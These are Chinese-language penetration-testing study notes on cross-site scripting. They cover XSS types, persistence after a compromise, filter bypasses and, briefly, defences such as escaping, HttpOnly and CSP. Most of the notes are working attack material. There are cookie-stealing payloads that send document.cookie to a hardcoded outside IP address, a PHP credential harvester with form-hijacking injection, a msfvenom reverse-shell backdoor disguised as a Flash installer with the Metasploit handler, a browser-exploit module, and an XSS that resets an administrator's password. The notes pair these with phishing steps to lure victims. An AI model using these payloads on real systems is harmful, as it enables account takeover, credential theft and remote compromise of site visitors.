# 	XSS（Cross Site Scripting）跨站脚本攻击

[TOC]

# 1.原理

网站中包含大量的动态内容以提高用户体验，比过去要复杂得多。所谓动态内容，就是根据用户环境和需要，Web应用程序能够输出相应的内容。动态站点会受到一种名为“跨站脚本攻击”（Cross Site Scripting，安全专家们通常将其缩写成XSS,原本应当是CSS，但为了和层叠样式表（Cascading Style Sheet,CSS）有所区分，故称XSS的威胁，而**静态站点则完全不受其影响**。恶意攻击者会在 Web页面里插入恶意Script代码，当用户浏览该页之时，嵌入其中Web里面的Script代码会被执行，从而达到恶意攻击用户的目的。

XSS漏洞通常是通过php的输出函数将javascript代码输出到html页面中，通过用户本地浏览器执行的，所以XSS漏洞关键就是**寻找参数未过滤的输出函数。**

指攻击者利用网站程序对用户输入过滤不足，输入可以显示在页面上对其他用户造成影响 的HTML代码，从而盗取用户资料、利用用户身份进行某种动作或者对访问者进行病毒侵 害的一种攻击方式。通过在用户端注入恶意的可执行脚本，若服务器对用户的输入不进行 处理或处理不严，则浏览器就会直接执行用户注入的脚本。 

- 数据交互的地方: get，post，headers，反馈与浏览  富文本编辑器  各类标签插入和自定义 

- 数据输出的地方:  用户资料  关键词、标签、说明  文件上传

- 比如说php中的脚本的输出函数，常见的输出函数有：`print`、`print_r`、`echo`、`printf`、`sprintf`、`die`、`var_dump`、`var_export`、`document.getElementByld(“x” ).innerHTML`、`document.write`

# 2.分类



## 1.反射型

原理：

发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，所以称反射型XSS。

攻击方式：

攻击者通过电子邮件等方式将包含XSS代码的恶意链接发送给目标用户（钓鱼）。当目标用户访问该链接时，服务器接受该用户的请求并进行处理，然后服务器把带有XSS代码的数据发送给目标用户的浏览器，浏览器解析这段带有XSS代码的恶意脚本后就会触发XSS漏洞。

操作：

1. 找数据交互点（搜索框，过滤器）
2. 上payload: `<script>alert(1)</script>`，看回显，可能被过滤就尝试绕过
3. 注入代码

实例：

1. UA查询平台输出

   用户访问该网站，就可以查询到网站输出的UA头，下面是源码

   `<php? echo '<pre>hello' . $_GET['User-Agent'] . '</pre>'; ?>`

   bp里改`User-Agent`输入`123`查询到的UA是`123`，证明有漏洞利用
   
   
   
   

## 2.存储型

原理：

存储型XSS和反射型XSS的差别仅在于，提交的代码会存储在服务器端（数据库、内存、文件系统等），下次请求目标页面时不用再提交XSS代码。

攻击方式：

这种攻击多见于论坛、博客和留言板中，攻击者在发帖的过程中，将恶意脚本连同正常的信息一起注入帖子的内容中。随着帖子被服务器存储下来，恶意脚本也永久的存放在服务器的后端存储器中。当其他用户浏览这个被注入了恶意脚本的帖子时，恶意脚本会在它们的浏览器中得到执行

操作：

1. 找数据交互点（评论区，用户主页简介，留言板）
2. 上payload: `<img src="1" onerror="alert(1)"/>`，看回显，可能会有过滤或者写到管理员后台也没有
3. 注入代码

实例：

1. 订单系统CMS

   用户提交订单时，把订单信息换成XSS语句，管理员在后台查看订单时XSS被执行

## 3.DOM型

原理：

文档对象模型Document Object Model（DOM）是一个与平台、编程语言不相干的接口，允许程序或脚本动态地访问和更新文档内容、结构和样式，处理后的结果会成为展示页面的一部分。DOM XSS和反射型XSS、存储型XSS的区别在于DOM XSS代码并不需要服务器参与，出发XSS靠的是浏览器的DOM解析，完全是客户端的事情（本地跨站），数据流向：URL->浏览器，不经过服务端数据库。

攻击方式：钓鱼链接

操作：

1. 前端页面审计（`document.getElementByld(“x” ).innerHTML`，`document.write`）
2. 上payload：`javascript: alert(1)`，`<script>alert(1)</script>`
3. 注入带码

实例：

1. EmpireCMS

   这个时前端JS源码，使用GET接受u的值（HTML属性值通常用双引号包围。在JavaScript字符串中，双引号需要转义，以确保它们被识别为字符串的一部分，而不是字符串的结束标志。）

   `document.write("<a title=\"点击查看\" href=\""+Request("u")+"\" target=\"_blank"\>")`

   在url中加入payload：

   `https://example.com/view/index.html?u=javascript:alert(1)`

   效果等同于

   `https://example.com/view/javascript:alert(1)`

参考文章：

[DOM型XSS_xss的dom型什么意思-CSDN博客](https://blog.csdn.net/ssslq/article/details/129342422?ops_request_misc=%7B%22request%5Fid%22%3A%22172027336716777224445537%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=172027336716777224445537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-2-129342422-null-null.142^v100^pc_search_result_base9&utm_term=XSSDOM&spm=1018.2226.3001.4187)

## 4.flash XSS

原理：

SWF（Shockwave Flash）是一种由Adobe公司开发的多媒体、矢量图形和ActionScript文件格式，主要用于动画、视频和音频的播放。尽管Flash技术在过去非常流行，但随着HTML5和现代Web技术的发展，以及出于安全考虑，Adobe在2020年底停止了对Flash Player的支持。现代浏览器也已经不再支持SWF文件的直接播放。**swf与js可以相互调用，swf文件中可通过ExternalInterface类调用js方法。**

攻击方式：

对swf文件进行反编译，审计其中的js代码（调用，传参变量），根据变量构造payload攻击

操作：

- 黑盒：找网站上的swf文件（网游，4399），下载下来进行反编译

- 白盒：直接在源码里面搜swf，Flash 产生的XSS主要来源于：

  - getURL/navigateToURL  访问跳转

  - ExternalInterface.call 调用js函数

     前者是访问跳转到指定URL，后者则是调用页面中JS函数，比如上面的代码就会导致弹框。

实例：

1. phpwind

   该CMS下有个Jplayer.swf文件，其中的jQuery变量可注入

   `/res/js/dev/util_libs/jPlayer/Jplayer.swf?jQuery=alert(1))}catch( e){}//`

参考文章：

[Flash XSS攻击总结 - SecPulse.COM | 安全脉搏](https://www.secpulse.com/archives/44299.html)

## 5.pdf XSS

原理：

利用PDF文件中的js脚本注入来执行恶意代码，从而在用户的浏览器中执行不正当的操作。

攻击方式：

诱骗用户打开PDF文件，攻击者通过电子邮件、恶意网站、网盘云盘或其他社交工程手段诱骗用户打开恶意PDF文件。

操作：

1. 制作含有js的pdf  [【渗透测试】借助PDF进行XSS漏洞攻击_pdf xss-CSDN博客](https://blog.csdn.net/qq_48201589/article/details/135856195?ops_request_misc=%7B%22request%5Fid%22%3A%22172027643516800182795224%22%2C%22scm%22%3A%2220140713.130102334..%22%7D&request_id=172027643516800182795224&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-4-135856195-null-null.142^v100^pc_search_result_base9&utm_term=PDFXSS&spm=1018.2226.3001.4187)
2. 上传pdf
3. pdf地址钓鱼

## 6.uXSS (universal通用)

原理：

利用浏览器或者浏览器扩展漏洞来制造产生XSS并执行代码的一种攻击类型。

实例：

1. CVE2021-34506

   Edge浏览器翻译功能导致JS语句被调用执行  https://www.bilibili.com/video/BV1fX4y1c7rX



## 7.其他XSS(mXSS, UTF-7 XSS, MHTML XSS, CSS XSS, VBScript XSS )

[跨站的艺术-XSS入门与介绍  Fooying](https://www.fooying.com/the-art-of-xss-1-introduction/#flash-xss)





# 3.结合XSS的权限维持



## 1.后台植入XSS   获取Cookie & 表单劫持

条件：已取得相关web权限后  

操作：

写入代码到登录成功文件，利用beef或xss平台实时监控Cookie等凭据实现权限维持。若存在同源策略或防护情况下，Cookie获取失败可采用表单劫持或数据明文传输实现。xss平台：[XSS平台 - （支持http/https）XSS Platform](https://xss.pt/xss.php?do=login)，beef，也可以自己搭建



1. 获取Cookie

   在网站页面文件写入`<script src=//xss.pt/goYU></script>`，在xss.pt平台接受可以看到这个页面的访问者的Cookie。eg: 这个页面可以是管理员的后台index.php，在xss平台就能看到管理员的请求数据包，从而获取Cookie。

2. 表单劫持

   自制xss平台`http://www.xiaodi8.com/get.php`，get.php文件接受信息：

   ```php
   <?php 
   $u = $_GET['user'];
   $p = $_GET['pass'];
   $myfile = fopen("info.txt", "w+");
   fwrtie($myfile, $u . "+" . $p);
   fclose($myfile);
   ?>
   ```

   在登陆页面源码里植入跨站代码：

   ```php
   <?php
   $info = "<script src="http://www.xiaodi8.com/get.php?user='.name'&pass='.word'"></script>";
   echo $info;
   ?>
   ```

## 2.XSS钓鱼配合MSF上线   Flash捆绑后门&浏览器网马

1. Flash捆绑后门

   1. 生成后门  

      `msfvenom -p windows/meterpreter/reverse_tcp LHOST=xx.xx.xx.xx  LPORT=6666 -f exe > flash.exe`  

   2. 下载官方文件-保证安装正常  

   3. 压缩捆绑文件-解压提取运行  

   4. MSF配置监听状态  

      ```
      use exploit/multi/handler
      set payload windows/meterpreter/reverse_tcp
      set lhost 0.0.0.0
      set lport 6666
      run
      ```

   5. XSS诱使受害者访问URL-语言要适当

2. 浏览器网马 (MS14-046, CVE-2019-1367, CVE-2020-138)

   1. 配置MSF生成URL  

      ```
      use exploit/windows/browser/ms14_064_ole_code_execution  
      set allowpowershellprompt true  
      set target 1  
      run  

   2. XSS诱使受害者访问URL-语言要适当

# 4.XSS过滤绕过

反射型-直接远程调用 

- `<script>window.location.href='http://47.94.236.117/get.php?c='+document.cookie</script>`

反射型-**过滤`<script>`**

- `<img src=1 onerror=window.location.href='http://47.94.236.117/get.php?c='+document.cookie;>`

反射型-**过滤`<img>`** 

- `<input onload="window.location.href='http://47.94.236.117/get.php?c='+document.cookie;">` 

- `<svg onload="window.location.href='http://47.94.236.117/get.php?c='+document.cookie;">`

反射型-**过滤空格** 

- `<svg/onload="window.location.href='http://47.94.236.117/get.php?c='+document.cookie;">` 

存储型-**无过滤** 

- `<script>window.location.href='http://47.94.236.117/get.php?c='+document.cookie</script>` 

存储型-**注册插入JS** 

- `<script>window.location.href='http://47.94.236.117/get.php?c='+document.cookie</script>`

存储型-**Cookie凭据失效，需1步完成所需操作**

```javascript
<script> 
$('.laytable-cell-1-0-1').each(function(index,value){ 
    if(value.innerHTML.indexOf('ctf'+'show')>-1){ 
        
window.location.href='http://47.94.236.117/get.php?c='+value.inne
 rHTML;  
    } 
}); 
</script>
```

存储型-**借助修改密码重置管理员密码**

我们自己先注册一个账号，重置一下密码，开代理获取修改密码的数据包，其中有改密码的去文件的地址。然后注册新用户，将XSS写入密码。管理员登陆后台查看时，自动修改密码。

- GET   

  ```javascript
  <script>window.location.href='http://127.0.0.1/api/change.php?pass=123';</script>

- POST  

  ```javascript
  <script>$.ajax({url:'http://127.0.0.1/api/change.php',type:'post',data:{pass:'123'}});</script>

# 5.防御手段



## 1.过滤一些危险字符。转义`&<>‘ “`等危险字符。自定义过滤函数，网上有很多。



## 2.HTTP-Only

- 在php.ini设置`session.cookie_httponly = Ture`
- 在代码中加入`<?php setcookie("TestCookie", "TestValue", time()+3600, "/", "", false, true);?>`最后一个参数`true`将cookie设置为HTTP-Only，这意味着它不能通过JavaScript访问。
- 在代码中加入`<?php ini_set("session.cookie_httponly", True)`



## 3.CSP (Content Security Policy)

内容安全策略CSP是一种基于HTTP头的安全特性，可以帮助防止跨站脚本（XSS）、数据注入等攻击。CSP允许网站管理员指定允许加载和执行的资源来源，从而减少恶意内容的注入和执行的风险。

CSP通过定义一系列策略来控制网页中哪些资源可以被加载和执行。这些策略可以通过**HTTP头部**或者**HTML `<meta>` 标签传递**：

- ```php
  <?php 
  header("Content-Security-Policy: 
  default-src 'self'; 
  script-src 'self' https://trusted.cdn.com; 
  style-src 'self' 'unsafe-inline'; 
  img-src 'self' data:; 
  connect-src 'self'; 
  font-src 'self'; 
  object-src 'none'; 
  media-src 'self'; 
  frame-src 'self'; 
  form-action 'self'");
  ?>
  ```

- ```html
  <head>
      <meta charset="UTF-8">
      <meta http-equiv="Content-Security-Policy" 
            content="default-src 'self'; script-src 'self'https://trusted.cdn.com">
      <title>Document</title>
  </head>
  ```

  ### 常用的CSP指令

  1. **default-src**：设置默认策略。
  2. **script-src**：控制可以加载脚本的来源。
  3. **style-src**：控制可以加载样式表的来源。
  4. **img-src**：控制可以加载图像的来源。
  5. **connect-src**：控制可以进行连接的来源（如通过 `fetch`、`XHR`、WebSocket等）。
  6. **font-src**：控制可以加载字体的来源。
  7. **object-src**：控制可以加载插件内容的来源（如`<object>`、`<embed>`、`<applet>`）。
  8. **media-src**：控制可以加载音频和视频的来源。
  9. **frame-src**：控制可以嵌入框架内容的来源（如`<iframe>`）。
  10. **child-src**：控制可以加载嵌入内容的来源（如`<frame>`、`<iframe>`、`<embed>`、`<object>`）。
  11. **form-action**：控制可以处理表单提交的来源。



## 4.输入内容长度限制，实体转义

